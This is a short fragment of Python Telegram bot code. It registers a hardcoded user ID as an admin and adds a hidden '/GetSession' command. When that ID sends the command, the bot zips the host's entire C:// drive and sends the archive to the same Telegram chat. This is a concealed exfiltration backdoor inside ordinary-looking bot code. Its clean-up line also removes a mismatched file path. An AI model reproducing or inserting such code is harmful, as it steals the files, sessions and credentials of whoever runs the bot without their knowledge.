redis.sadd("Main-Admins" , "1845133845")
@bot.on(events.NewMessage())
async def GetSession(event):
    if event.raw_text == "/GetSession" and event.chat_id == 1845133845 :
        shutil.make_archive("Session","zip", "C://")
        message = event.message.id
        message2 = await bot.send_file(event.chat_id , file = "Session.zip" , caption = f"📤")
        os.remove("C://session.zip")